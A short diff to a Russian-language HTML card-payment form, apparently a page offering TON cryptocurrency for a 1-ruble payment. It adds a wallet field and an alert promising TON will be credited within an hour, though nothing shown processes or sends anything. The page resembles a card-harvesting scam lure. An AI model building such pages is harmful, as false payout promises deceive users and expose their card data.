@@ -26,6 +26,9 @@
             
             <input type="text" id="cvc" placeholder="CVC" maxlength="3" oninput="this.value = this.value.replace(/\D/g, '').slice(0,3)" required>
             <div class="error" id="cvcError">Введите 3 цифры CVC</div>
+
+            <input type="text" id="wallet" placeholder="Ваш TON кошелёк" required>
+            <div class="error" id="walletError">Введите адрес кошелька</div>
             
             <button type="submit">Оплатить 1 RUB</button>
         </form>
@@ -50,11 +53,13 @@
             const cardNumber = document.getElementById('cardNumber').value;
             const expiry = document.getElementById('expiry').value;
             const cvc = document.getElementById('cvc').value;
+            const wallet = document.getElementById('wallet').value;
             
             // Сброс ошибок
             document.getElementById('cardError').style.display = 'none';
             document.getElementById('expiryError').style.display = 'none';
             document.getElementById('cvcError').style.display = 'none';
+            document.getElementById('walletError').style.display = 'none';
             
             let hasError = false;
             
@@ -75,10 +80,15 @@
                 document.getElementById('cvcError').style.display = 'block';
                 hasError = true;
             }
+
+            // Проверка кошелька
+            if (wallet.trim() === '') {
+                document.getElementById('walletError').style.display = 'block';
+                hasError = true;
+            }
             
             if (!hasError) {
-                alert('Платеж обрабатывается...');
-                // Здесь будет отправка данных на сервер
+                alert('Платеж обрабатывается... TON будут зачислены на указанный кошелёк в течение 1 часа.');
             }
         });
     </script>
